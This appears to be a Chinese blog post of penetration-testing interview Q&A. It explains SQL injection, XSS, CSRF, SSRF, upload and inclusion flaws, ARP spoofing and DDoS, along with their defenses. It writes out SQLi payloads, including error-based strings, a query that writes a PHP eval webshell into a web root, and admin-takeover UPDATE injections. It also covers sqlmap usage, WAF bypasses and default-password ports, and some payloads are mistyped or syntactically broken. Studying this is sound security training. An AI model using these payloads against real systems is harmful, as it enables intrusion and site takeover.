<p>有写入权限的，构造联合查询语句使用using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell<br>使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高<br>通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell</p>
<p><strong>38、给你一个网站你是如何来渗透测试的?</strong><br>在获取书面授权的前提下。</p>
<p><strong>39、sqlmap，怎么对一个注入点注入？</strong><br>1）如果是get型号，直接，sqlmap -u “诸如点网址”.<br>2) 如果是post型诸如点，可以sqlmap -u “注入点网址” –data=”post的参数”<br>3）如果是cookie，X-Forwarded-For等，可以访问的时候，用burpsuite抓包，注入处用号替换，放到文件里，然后sqlmap -r “文件地址”</p>
<p><strong>40、nmap，扫描的几种方式</strong></p>
<p><strong>41、sql注入的几种类型？</strong><br>1）报错注入<br>2）bool型注入<br>3）延时注入<br>4）宽字节注入<br><strong>42、报错注入的函数有哪些？ 10个</strong><br>1）and extractvalue(1, concat(0x7e,(select @@version),0x7e))】】】<br>2）通过floor报错 向下取整<br>3）+and updatexml(1, concat(0x7e,(secect @@version),0x7e),1)<br>4）.geometrycollection()select from test where id=1 and geometrycollection((select from(selectfrom(select user())a)b));<br>5）.multipoint()select from test where id=1 and multipoint((select from(select from(select user())a)b));<br>6）.polygon()select from test where id=1 and polygon((select from(select from(select user())a)b));<br>7）.multipolygon()select from test where id=1 and multipolygon((select from(select from(select user())a)b));<br>8）.linestring()select from test where id=1 and linestring((select from(select from(select user())a)b));<br>9）.multilinestring()select from test where id=1 and multilinestring((select from(select from(select user())a)b));<br>10）.exp()select from test where id=1 and exp(~(select * from(select user())a));</p>
<p><strong>43、延时注入如何来判断？</strong><br>if(ascii(substr(“hello”, 1, 1))=104, sleep(5), 1)</p>
<p><strong>44、盲注和延时注入的共同点？</strong><br>都是一个字符一个字符的判断</p>
<p><strong>45、如何拿一个网站的webshell？</strong><br>上传，后台编辑模板，sql注入写文件，命令执行，代码执行，<br>一些已经爆出的cms漏洞，比如dedecms后台可以直接建立脚本文件，wordpress上传插件包含脚本文件zip压缩包等</p>
<p><strong>46、sql注入写文件都有哪些函数？</strong><br>select ‘一句话’ into outfile ‘路径’<br>select ‘一句话’ into dumpfile ‘路径’<br>select ‘<?php eval($_POST[1]) ?>‘ into dumpfile  ‘d:\wwwroot\baidu.com\nvhack.php’;</p>
<p><strong>47、如何防止CSRF?</strong><br>1,验证referer<br>2，验证token<br>详细：<a href="http://cnodejs.org/topic/5533dd6e9138f09b629674fd" target="_blank" rel="noopener">http://cnodejs.org/topic/5533dd6e9138f09b629674fd</a></p>
<p><strong>48、owasp 漏洞都有哪些？</strong><br>1、SQL注入防护方法：<br>2、失效的身份认证和会话管理<br>3、跨站脚本攻击XSS<br>4、直接引用不安全的对象<br>5、安全配置错误<br>6、敏感信息泄露<br>7、缺少功能级的访问控制<br>8、跨站请求伪造CSRF<br>9、使用含有已知漏洞的组件<br>10、未验证的重定向和转发</p>
<p><strong>49、SQL注入防护方法？</strong><br>1、使用安全的API<br>2、对输入的特殊字符进行Escape转义处理<br>3、使用白名单来规范化输入验证方法<br>4、对客户端输入进行控制，不允许输入SQL注入相关的特殊字符<br>5、服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。</p>
<p><strong>50、代码执行，文件读取，命令执行的函数都有哪些？</strong></p>
<p>1）代码执行：</p>
<p>eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function</p>
<p>2）文件读取：</p>
<p>file_get_contents(),highlight_file(),fopen(),read </p>
<p>file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等<br>3)命令执行：</p>
<p>system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</p>
<p><strong>51、img标签除了onerror属性外，还有其他获取管理员路径的办法吗？</strong><br>src指定一个远程的脚本文件，获取referer</p>
<p><strong>52、img标签除了onerror属性外，并且src属性的后缀名，必须以.jpg结尾，怎么获取管理员路径。</strong></p>
<p>1）远程服务器修改apache配置文件，配置.jpg文件以php方式来解析<br>AddType application/x-httpd-php .jpg<br>&lt;img src=<a href="http://xss.tv/1.jpg" target="_blank" rel="noopener">http://xss.tv/1.jpg</a>&gt; 会以php方式来解析</p>
<p><strong>53、为什么aspx木马权限比asp大？</strong></p>
<p>aspx使用的是.net技术。IIS 中默认不支持，ASP只是脚本语言而已。入侵的时候asp的木马一般是guest权限…APSX的木马一般是users权限。</p>
<p><strong>54、如何绕过waf？</strong></p>
<ul>
<li>大小写转换法</li>
<li>干扰字符 <code>/*!*/</code></li>
<li>编码 base64 unicode hex url ascll</li>
<li>复参数</li>
</ul>
<p><strong>55、如何向服务器写入webshell？</strong></p>
<ul>
<li>各种上传漏洞</li>
<li>mysql具有写入权限,用sql语句写入shell</li>
<li>http put方法</li>
</ul>
<p><strong>56、渗透测试中常见的端口</strong></p>
<p>1,web类(web漏洞/敏感目录)<br>第三方通用组件漏洞struts thinkphp jboss ganglia zabbix</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">80 web </span><br><span class="line">80-89 web </span><br><span class="line">8000-9090 web</span><br></pre></td></tr></table></figure>
<p>2,数据库类(扫描弱口令)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1433 MSSQL </span><br><span class="line">1521 Oracle </span><br><span class="line">3306 MySQL </span><br><span class="line">5432 PostgreSQL</span><br></pre></td></tr></table></figure>
<p>3,特殊服务类(未授权/命令执行类/漏洞)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">443 SSL心脏滴血 </span><br><span class="line">873 Rsync未授权 </span><br><span class="line">5984 CouchDB http://xxx:5984/_utils/ </span><br><span class="line">6379 redis未授权 </span><br><span class="line">7001,7002 WebLogic默认弱口令，反序列 </span><br><span class="line">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 </span><br><span class="line">11211 memcache未授权访问 </span><br><span class="line">27017,27018 Mongodb未授权访问 </span><br><span class="line">50000 SAP命令执行 </span><br><span class="line">50070,50030 hadoop默认端口未授权访问</span><br></pre></td></tr></table></figure>
<p>4,常用端口类(扫描弱口令/端口爆破)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">21 ftp </span><br><span class="line">22 SSH </span><br><span class="line">23 Telnet </span><br><span class="line">2601,2604 zebra路由，默认密码zebra</span><br><span class="line">3389 远程桌面</span><br></pre></td></tr></table></figure>
<blockquote>
<p>端口合计详情</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">21 ftp </span><br><span class="line">22 SSH </span><br><span class="line">23 Telnet </span><br><span class="line">80 web </span><br><span class="line">80-89 web </span><br><span class="line">161 SNMP </span><br><span class="line">389 LDAP </span><br><span class="line">443 SSL心脏滴血以及一些web漏洞测试 </span><br><span class="line">445 SMB </span><br><span class="line">512,513,514 Rexec </span><br><span class="line">873 Rsync未授权 </span><br><span class="line">1025,111 NFS </span><br><span class="line">1433 MSSQL </span><br><span class="line">1521 Oracle:(iSqlPlus Port:5560,7778) </span><br><span class="line">2082/2083 cpanel主机管理系统登陆 （国外用较多）</span><br><span class="line">2222 DA虚拟主机管理系统登陆 （国外用较多） </span><br><span class="line">2601,2604 zebra路由，默认密码zebra</span><br><span class="line">3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 </span><br><span class="line">3306 MySQL </span><br><span class="line">3312/3311 kangle主机管理系统登陆 </span><br><span class="line">3389 远程桌面 </span><br><span class="line">4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 </span><br><span class="line">5432 PostgreSQL </span><br><span class="line">5900 vnc </span><br><span class="line">5984 CouchDB http://xxx:5984/_utils/ </span><br><span class="line">6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 </span><br><span class="line">6379 redis未授权 </span><br><span class="line">7001,7002 WebLogic默认弱口令，反序列 </span><br><span class="line">7778 Kloxo主机控制面板登录 </span><br><span class="line">8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 </span><br><span class="line">8080 tomcat/WDCP主机管理系统，默认弱口令 </span><br><span class="line">8080,8089,9090 JBOSS </span><br><span class="line">8083 Vestacp主机管理系统 （国外用较多） </span><br><span class="line">8649 ganglia </span><br><span class="line">8888 amh/LuManager 主机管理系统默认端口 </span><br><span class="line">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 </span><br><span class="line">10000 Virtualmin/Webmin 服务器虚拟主机管理系统 </span><br><span class="line">11211 memcache未授权访问 </span><br><span class="line">27017,27018 Mongodb未授权访问 </span><br><span class="line">28017 mongodb统计页面 </span><br><span class="line">50000 SAP命令执行 </span><br><span class="line">50070,50030 hadoop默认端口未授权访问</span><br></pre></td></tr></table></figure>

<h2 id="深信服一面"><a href="#深信服一面" class="headerlink" title=" 深信服一面:"></a><span id="head8"> 深信服一面:</span></h2><ul>
<li>了解哪些漏洞</li>
<li>文件上传有哪些防护方式</li>
<li>用什么扫描端口，目录</li>
<li>如何判断注入</li>
<li>注入有防护怎么办</li>
<li>有没有写过tamper</li>
<li>3306 1443 8080是什么端口</li>
<li>计算机网络从物理层到应用层xxxx</li>
<li>有没有web服务开发经验</li>
<li>如何向服务器写入webshell</li>
<li>有没有用过xss平台</li>
<li>网站渗透的流程</li>
<li>mysql两种提权方式（udf，？）</li>
<li>常见加密方式xxx</li>
<li>ddos如何防护</li>
<li>有没有抓过包，会不会写wireshark过滤规则</li>
<li>清理日志要清理哪些</li>
</ul>
<h2 id="SQL注入防护"><a href="#SQL注入防护" class="headerlink" title=" SQL注入防护"></a><span id="head9"> SQL注入防护</span></h2><p>1、使用安全的API<br>2、对输入的特殊字符进行Escape转义处理<br>3、使用白名单来规范化输入验证方法<br>4、对客户端输入进行控制，不允许输入SQL注入相关的特殊字符<br>5、服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。<br>\6. 规范编码,字符集</p>
<h2 id="为什么参数化查询可以防止sql注入"><a href="#为什么参数化查询可以防止sql注入" class="headerlink" title=" 为什么参数化查询可以防止sql注入"></a><span id="head10"> 为什么参数化查询可以防止sql注入</span></h2><p>原理:</p>
<p>使用参数化查询数据库服务器不会把参数的内容当作sql指令的一部分来执行，是在数据库完成sql指令的编译后才套用参数运行</p>
<p>简单的说:<br>参数化能防注入的原因在于,语句是语句，参数是参数，参数的值并不是语句的一部分，数据库只按语句的语义跑</p>
<h2 id="SQL头注入点"><a href="#SQL头注入点" class="headerlink" title=" SQL头注入点"></a><span id="head11"> SQL头注入点</span></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UA</span><br><span class="line">REFERER</span><br><span class="line">COOKIE</span><br><span class="line">IP</span><br></pre></td></tr></table></figure>

<h2 id="盲注是什么？怎么盲注？"><a href="#盲注是什么？怎么盲注？" class="headerlink" title=" 盲注是什么？怎么盲注？"></a><span id="head12"> 盲注是什么？怎么盲注？</span></h2><p>盲注是在SQL注入攻击过程中，服务器关闭了错误回显，我们单纯通过服务器返回内容的变化来判断是否存在SQL注入和利用的方式。盲注的手段有两种，一个是通过页面的返回内容是否正确(boolean-based)，来验证是否存在注入。一个是通过sql语句处理时间的不同来判断是否存在注入(time-based)，在这里，可以用benchmark，sleep等造成延时效果的函数，也可以通过构造大笛卡儿积的联合查询表来达到延时的目的。</p>
<h2 id="宽字节注入产生原理以及根本原因"><a href="#宽字节注入产生原理以及根本原因" class="headerlink" title=" 宽字节注入产生原理以及根本原因"></a><span id="head13"> 宽字节注入产生原理以及根本原因</span></h2><h3 id="产生原理"><a href="#产生原理" class="headerlink" title=" 产生原理"></a><span id="head14"> 产生原理</span></h3><p>在数据库使用了宽字符集而WEB中没考虑这个问题的情况下，在WEB层，由于0XBF27是两个字符，在PHP中比如addslash和magic_quotes_gpc开启时，由于会对0x27单引号进行转义，因此0xbf27会变成0xbf5c27,而数据进入数据库中时，由于0XBF5C是一个另外的字符，因此\转义符号会被前面的bf带着”吃掉”，单引号由此逃逸出来可以用来闭合语句。</p>
<h3 id="在哪里编码"><a href="#在哪里编码" class="headerlink" title=" 在哪里编码"></a><span id="head15"> 在哪里编码</span></h3><h3 id="根本原因"><a href="#根本原因" class="headerlink" title=" 根本原因"></a><span id="head16"> 根本原因</span></h3><p>character_set_client(客户端的字符集)和character_set_connection(连接层的字符集)不同,或转换函数如，iconv、mb_convert_encoding使用不当。</p>
<h3 id="解决办法"><a href="#解决办法" class="headerlink" title=" 解决办法"></a><span id="head17"> 解决办法</span></h3><p>统一数据库、Web应用、操作系统所使用的字符集，避免解析产生差异，最好都设置为UTF-8。<br>或对数据进行正确的转义，如mysql_real_escape_string+mysql_set_charset的使用。</p>
<h3 id="sql里面只有update怎么利用"><a href="#sql里面只有update怎么利用" class="headerlink" title=" sql里面只有update怎么利用"></a><span id="head18"> sql里面只有update怎么利用</span></h3><p>先理解这句 SQL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATE user SET password=&apos;MD5($password)&apos;, homepage=&apos;$homepage&apos; WHERE id=&apos;$id&apos;</span><br></pre></td></tr></table></figure>

<p>如果此 SQL 被修改成以下形式，就实现了注入</p>
<p>1：修改 homepage 值为<code>http://xxx.net&#39;, userlevel=&#39;3</code></p>
<p>之后 SQL 语句变为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATE user SET password=&apos;mypass&apos;, homepage=&apos;http://xxx.net&apos;, userlevel=&apos;3&apos; WHERE id=&apos;$id&apos;</span><br></pre></td></tr></table></figure>

<p>userlevel 为用户级别</p>
<p>2:修改 password 值为<code>mypass)&#39; WHERE username=&#39;admin&#39;#</code></p>
<p>之后 SQL 语句变为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATE user SET password=&apos;MD5(mypass)&apos; WHERE username=&apos;admin&apos;#)&apos;, homepage=&apos;$homepage&apos; WHERE id=&apos;$id&apos;</span><br></pre></td></tr></table></figure>

<p>3：修改 id 值为<code>&#39; OR username=&#39;admin&#39;</code><br>之后 SQL 语句变为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATE user SET password=&apos;MD5($password)&apos;, homepage=&apos;$homepage&apos; WHERE id=&apos;&apos; OR username=&apos;admin&apos;</span><br></pre></td></tr></table></figure>

<h2 id="sql如何写shell-单引号被过滤怎么办"><a href="#sql如何写shell-单引号被过滤怎么办" class="headerlink" title=" sql如何写shell/单引号被过滤怎么办"></a><span id="head19"> sql如何写shell/单引号被过滤怎么办</span></h2><p>写shell: root权限，GPC关闭，知道文件路径<br>outfile函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">`http://127.0.0.1:81/sqli.php?id=1 into outfile &apos;C:\\wamp64\\www\\phpinfo.php&apos; FIELDS TERMINATED BY &apos;&lt;?php phpinfo(); ?&gt;&apos;`</span><br><span class="line"></span><br><span class="line">`http://127.0.0.1:81/sqli.php?id=-1 union select 1,0x3c3f70687020706870696e666f28293b203f3e,3,4 into outfile &apos;C:\\wamp64\\www\\phpinfo.php&apos;`</span><br></pre></td></tr></table></figure>

<p>宽字节注入</p>
<h3 id="代替空格的方法"><a href="#代替空格的方法" class="headerlink" title=" 代替空格的方法"></a><span id="head20"> 代替空格的方法</span></h3><p>%0a、%0b、%a0 等<br>/**/ 等注释符<br>&lt;&gt;</p>
<h3 id="mysql的网站注入，5-0以上和5-0以下有什么区别？"><a href="#mysql的网站注入，5-0以上和5-0以下有什么区别？" class="headerlink" title=" mysql的网站注入，5.0以上和5.0以下有什么区别？"></a><span id="head21"> mysql的网站注入，5.0以上和5.0以下有什么区别？</span></h3><p>5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。</p>
<p>5.0以下是多用户单操作，5.0以上是多用户多操做。</p>
<h1 id="XSS"><a href="#XSS" class="headerlink" title=" XSS"></a><span id="head22"> XSS</span></h1><h2 id="XSS原理"><a href="#XSS原理" class="headerlink" title=" XSS原理"></a><span id="head23"> XSS原理</span></h2><h3 id="反射型"><a href="#反射型" class="headerlink" title=" 反射型"></a><span id="head24"> 反射型</span></h3><p>用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。<br>需要诱使用户“点击”一个恶意链接，才能攻击成功</p>
<h3 id="储存型"><a href="#储存型" class="headerlink" title=" 储存型"></a><span id="head25"> 储存型</span></h3><p>存储型XSS会把用户输入的数据“存储”在服务器端。<br>这种XSS具有很强的稳定性。</p>
<h3 id="DOM型"><a href="#DOM型" class="headerlink" title=" DOM型"></a><span id="head26"> DOM型</span></h3><p>通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。</p>
<h2 id="DOM型和反射型的区别"><a href="#DOM型和反射型的区别" class="headerlink" title=" DOM型和反射型的区别"></a><span id="head27"> DOM型和反射型的区别</span></h2><p>反射型XSS：通过诱导用户点击，我们构造好的恶意payload才会触发的XSS。<br>反射型XSS的检测我们在每次请求带payload的链接时页面应该是会带有特定的畸形数据的。<br>DOM型：通过修改页面的DOM节点形成的XSS。<br>DOM-based XSS由于是通过js代码进行dom操作产生的XSS，所以在请求的响应中我们甚至不一定会得到相应的畸形数据。<br>根本区别在我看来是输出点的不同。</p>
<h2 id="DOM型XSS-自动化测试或人工测试"><a href="#DOM型XSS-自动化测试或人工测试" class="headerlink" title="DOM型XSS 自动化测试或人工测试"></a><span id="head28">DOM型XSS 自动化测试或人工测试</span></h2><p>人工测试思路：找到类似document.write、innerHTML赋值、outterHTML赋值、window.location操作、写javascript:后内容、eval、setTimeout 、setInterval 等直接执行之类的函数点。找到其变量，回溯变量来源观察是否可控，是否经过安全函数。<br>自动化测试参看道哥的博客，思路是从输入入手，观察变量传递的过程，最终检查是否有在危险函数输出，中途是否有经过安全函数。但是这样就需要有一个javascript解析器，否则会漏掉一些通过js执行带入的部分内容。</p>
<p>在回答这段问题的时候，由于平时对客户的检测中，基本是凭借不同功能点的功能加上经验和直觉来进行检测，对不同类型的XSS检测方式实际上并没有太过细分的标准化检测方式，所以回答的很烂。。。</p>
<h2 id="如何快速发现xss位置"><a href="#如何快速发现xss位置" class="headerlink" title=" 如何快速发现xss位置"></a><span id="head29"> 如何快速发现xss位置</span></h2><h2 id="对于XSS怎么修补建议"><a href="#对于XSS怎么修补建议" class="headerlink" title=" 对于XSS怎么修补建议"></a><span id="head30"> 对于XSS怎么修补建议</span></h2><p>输入点检查：对用户输入的数据进行合法性检查，使用filter过滤敏感字符或对进行编码转义，针对特定类型数据进行格式检查。针对输入点的检查最好放在服务器端实现。</p>
<p>输出点检查：对变量输出到HTML页面中时，对输出内容进行编码转义，输出在HTML中时，对其进行HTMLEncode，如果输出在Javascript脚本中时，对其进行JavascriptEncode。<br>对使用JavascriptEncode的变量都放在引号中并转义危险字符，data部分就无法逃逸出引号外成为code的一部分。还可以使用更加严格的方法，对所有数字字母之外的字符都使用十六进制编码。此外，要注意在浏览器中，HTML的解析会优先于Javascript的解析，编码的方式也需要考虑清楚，针对不同的输出点，我们防御XSS的方法可能会不同，这点可能在之后的文章会做下总结。</p>
<p>除此之外，还有做HTTPOnly对Cookie劫持做限制。</p>
<h2 id="XSS蠕虫的产生条件"><a href="#XSS蠕虫的产生条件" class="headerlink" title=" XSS蠕虫的产生条件"></a><span id="head31"> XSS蠕虫的产生条件</span></h2><p>正常情况下，一个是产生XSS点的页面不属于self页面，用户之间产生交互行为的页面，都可能造成XSS Worm的产生。<strong>不一定需要</strong>存储型XSS</p>
<h1 id="CSRF"><a href="#CSRF" class="headerlink" title=" CSRF"></a><span id="head32"> CSRF</span></h1><h2 id="CSRF原理"><a href="#CSRF原理" class="headerlink" title=" CSRF原理"></a><span id="head33"> CSRF原理</span></h2><p>CSRF是跨站请求伪造攻击，由客户端发起,是由于没有在关键操作执行时进行是否由用户自愿发起的确认</p>
<h2 id="防御"><a href="#防御" class="headerlink" title=" 防御"></a><span id="head34"> 防御</span></h2><ul>
<li>验证Referer</li>
<li>添加token</li>
</ul>
<h2 id="token和referer做横向对比，谁安全等级高？"><a href="#token和referer做横向对比，谁安全等级高？" class="headerlink" title=" token和referer做横向对比，谁安全等级高？"></a><span id="head35"> token和referer做横向对比，谁安全等级高？</span></h2><p>token安全等级更高，因为并不是任何服务器都可以取得referer，如果从HTTPS跳到HTTP，也不会发送referer。并且FLASH一些版本中可以自定义referer。<br>但是token的话，要保证其足够随机且不可泄露。(不可预测性原则)</p>
<h2 id="对referer的验证，从什么角度去做？如果做，怎么杜绝问题"><a href="#对referer的验证，从什么角度去做？如果做，怎么杜绝问题" class="headerlink" title=" 对referer的验证，从什么角度去做？如果做，怎么杜绝问题"></a><span id="head36"> 对referer的验证，从什么角度去做？如果做，怎么杜绝问题</span></h2><p>对header中的referer的验证，一个是空referer，一个是referer过滤或者检测不完善。<br>为了杜绝这种问题，在验证的白名单中，正则规则应当写完善。</p>
<h2 id="针对token，对token测试会注意哪方面内容，会对token的哪方面进行测试？"><a href="#针对token，对token测试会注意哪方面内容，会对token的哪方面进行测试？" class="headerlink" title=" 针对token，对token测试会注意哪方面内容，会对token的哪方面进行测试？"></a><span id="head37"> 针对token，对token测试会注意哪方面内容，会对token的哪方面进行测试？</span></h2><p>引用一段请教前辈的回答：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">针对token的攻击，一是对它本身的攻击，重放测试一次性、分析加密规则、校验方式是否正确等，二是结合信息泄露漏洞对它的获取，结合着发起组合攻击</span><br><span class="line">信息泄露有可能是缓存、日志、get，也有可能是利用跨站</span><br><span class="line">很多跳转登录的都依赖token，有一个跳转漏洞加反射型跨站就可以组合成登录劫持了</span><br><span class="line">另外也可以结合着其它业务来描述token的安全性及设计不好怎么被绕过比如抢红包业务之类的</span><br></pre></td></tr></table></figure>

<h1 id="SSRF"><a href="#SSRF" class="headerlink" title=" SSRF"></a><span id="head38"> SSRF</span></h1><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
<p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
<h2 id="检测"><a href="#检测" class="headerlink" title=" 检测"></a><span id="head39"> 检测</span></h2><p>SSRF漏洞的验证方法：</p>
<p>1）因为SSRF漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的，从而来判断是否存在SSRF漏洞</p>
<p>2）在页面源码中查找访问的资源地址 ，如果该资源地址类型为 <a href="http://www.baidu.com/xxx.php?image=（地址）的就可能存在SSRF漏洞" target="_blank" rel="noopener">www.baidu.com/xxx.php?image=（地址）的就可能存在SSRF漏洞 4</a></p>
<h2 id="SSRF漏洞的成因-防御-绕过"><a href="#SSRF漏洞的成因-防御-绕过" class="headerlink" title="SSRF漏洞的成因 防御 绕过"></a><span id="head40">SSRF漏洞的成因 防御 绕过</span></h2><p>成因：模拟服务器对其他服务器资源进行请求，没有做合法性验证。<br>利用：构造恶意内网IP做探测，或者使用其余所支持的协议对其余服务进行攻击。<br>防御：禁止跳转，限制协议，内外网限制，URL限制。<br>绕过：使用不同协议，针对IP，IP格式的绕过，针对URL，恶意URL增添其他字符，@之类的。301跳转+dns rebindding。</p>
<h1 id="上传"><a href="#上传" class="headerlink" title=" 上传"></a><span id="head41"> 上传</span></h1><h2 id="文件上传漏洞原理"><a href="#文件上传漏洞原理" class="headerlink" title=" 文件上传漏洞原理"></a><span id="head42"> 文件上传漏洞原理</span></h2><p>由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致用户可以越过其本身权限向服务器上传可执行的动态脚本文件</p>
<h2 id="常见的上传绕过方式"><a href="#常见的上传绕过方式" class="headerlink" title=" 常见的上传绕过方式"></a><span id="head43"> 常见的上传绕过方式</span></h2><ul>
<li>前端js验证：禁用js/burp改包</li>
<li>大小写</li>
<li>双重后缀名</li>
<li>过滤绕过 pphphp-&gt;php</li>
</ul>
<h2 id="防护"><a href="#防护" class="headerlink" title=" 防护"></a><span id="head44"> 防护</span></h2><ul>
<li>文件上传目录设置为不可执行</li>
<li>使用白名单判断文件上传类型</li>
<li>用随机数改写文件名和路径</li>
</ul>
<h2 id="审查上传点的元素有什么意义？"><a href="#审查上传点的元素有什么意义？" class="headerlink" title=" 审查上传点的元素有什么意义？"></a><span id="head45"> 审查上传点的元素有什么意义？</span></h2><p>有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。</p>
<h1 id="文件包含"><a href="#文件包含" class="headerlink" title=" 文件包含"></a><span id="head46"> 文件包含</span></h1><h2 id="原理"><a href="#原理" class="headerlink" title=" 原理"></a><span id="head47"> 原理</span></h2><p>引入一段用户能控制的脚本或代码，并让服务器端执行<br>（1）include()等函数通过动态变量的方式引入需要包含的文件；<br>（2）用户能够控制该动态变量。</p>
<h2 id="导致文件包含的函数"><a href="#导致文件包含的函数" class="headerlink" title=" 导致文件包含的函数"></a><span id="head48"> 导致文件包含的函数</span></h2><p>PHP：include(), include_once(), require(), re-quire_once(), fopen(), readfile(), …<br>JSP/Servlet：ava.io.File(), java.io.Fil-eReader(), …<br>ASP：include file, include virtual,</p>
<h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title=" 本地文件包含"></a><span id="head49"> 本地文件包含</span></h2><p>能够打开并包含本地文件的漏洞，被称为本地文件包含漏洞</p>
<h1 id="XXE"><a href="#XXE" class="headerlink" title=" XXE"></a><span id="head50"> XXE</span></h1><h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title=" 逻辑漏洞"></a><span id="head51"> 逻辑漏洞</span></h1><h2 id="金融行业常见逻辑漏洞"><a href="#金融行业常见逻辑漏洞" class="headerlink" title=" 金融行业常见逻辑漏洞"></a><span id="head52"> 金融行业常见逻辑漏洞</span></h2><p>单针对金融业务的<br>主要是数据的篡改(涉及金融数据，或部分业务的判断数据)，由竞争条件或者设计不当引起的薅羊毛，交易/订单信息泄露，水平越权对别人的账户查看或恶意操作，交易或业务步骤绕过。</p>
<h1 id="溢出"><a href="#溢出" class="headerlink" title=" 溢出"></a><span id="head53"> 溢出</span></h1><h1 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title=" 中间人攻击"></a><span id="head54"> 中间人攻击</span></h1><p>中间人攻击是一个（缺乏）相互认证的攻击；由于客户端与服务器之间在SSL握手的过程中缺乏相互认证而造成的漏洞</p>
<p>防御中间人攻击的方案通常基于一下几种技术</p>
<p>1.公钥基础建设PKI<br>使用PKI相互认证机制，客户端验证服务器，服务器验证客户端；上述两个例子中都是只验证服务器，这样就造成了SSL握手环节的漏洞，而如果使用相互认证的的话，基本可以更强力的相互认证</p>
<p>2.延迟测试</p>
<p>使用复杂加密哈希函数进行计算以造成数十秒的延迟；如果双方通常情况下都要花费20秒来计算，并且整个通讯花费了60秒计算才到达对方，这就能表明存在第三方中间人。</p>
<p>3.使用其他形式的密钥交换形式</p>
<h2 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title=" ARP欺骗"></a><span id="head55"> ARP欺骗</span></h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title=" 原理:"></a><span id="head56"> 原理:</span></h3><p>每台主机都有一个ARP缓存表，缓存表中记录了IP地址与MAC地址的对应关系，而局域网数据传输依靠的是MAC地址。<br>在ARP缓存表机制存在一个缺陷，就是当请求主机收到ARP应答包后，不会去验证自己是否向对方主机发送过ARP请求包，就直接把这个返回包中的IP地址与MAC地址的对应关系保存进ARP缓存表中，如果原有相同IP对应关系，原有的则会被替换。这样攻击者就有了偷听主机传输的数据的可能</p>
<h3 id="防护-1"><a href="#防护-1" class="headerlink" title=" 防护"></a><span id="head57"> 防护</span></h3><p>1.在主机绑定网关MAC与IP地址为静态（默认为动态），命令：arp -s 网关IP 网关MAC</p>
<p>2.在网关绑定主机MAC与IP地址</p>
<p>3.使用ARP防火墙</p>
<h1 id="DDOS"><a href="#DDOS" class="headerlink" title=" DDOS"></a><span id="head58"> DDOS</span></h1><h2 id="Ddos原理"><a href="#Ddos原理" class="headerlink" title=" Ddos原理"></a><span id="head59"> Ddos原理</span></h2><p>利用合理的请求造成资源过载，导致服务不可用</p>
<h3 id="syn洪流的原理"><a href="#syn洪流的原理" class="headerlink" title=" syn洪流的原理"></a><span id="head60"> syn洪流的原理</span></h3><p>伪造大量的源IP地址，分别向服务器端发送大量的SYN包，此时服务器端会返回SYN/ACK包，因为源地址是伪造的，所以伪造的IP并不会应答，服务器端没有收到伪造IP的回应，会重试3～5次并且等待一个SYNTime（一般为30秒至2分钟），如果超时则丢弃这个连接。攻击者大量发送这种伪造源地址的SYN请求，服务器端将会消耗非常多的资源（CPU和内存）来处理这种半连接，同时还要不断地对这些IP进行SYN+ACK重试。最后的结果是服务器无暇理睬正常的连接请求，导致拒绝服务。</p>
<h3 id="CC攻击原理"><a href="#CC攻击原理" class="headerlink" title=" CC攻击原理"></a><span id="head61"> CC攻击原理</span></h3><p>对一些消耗资源较大的应用页面不断发起正常的请求，以达到消耗服务端资源的目的。</p>
<h2 id="DDOS防护"><a href="#DDOS防护" class="headerlink" title=" DDOS防护"></a><span id="head62"> DDOS防护</span></h2><p>SYN Cookie/SYN Proxy、safereset等算法。SYN Cookie的主要思想是为每一个IP地址分配一个“Cookie”，并统计每个IP地址的访问频率。如果在短时间内收到大量的来自同一个IP地址的数据包，则认为受到攻击，之后来自这个IP地址的包将被丢弃。</p>
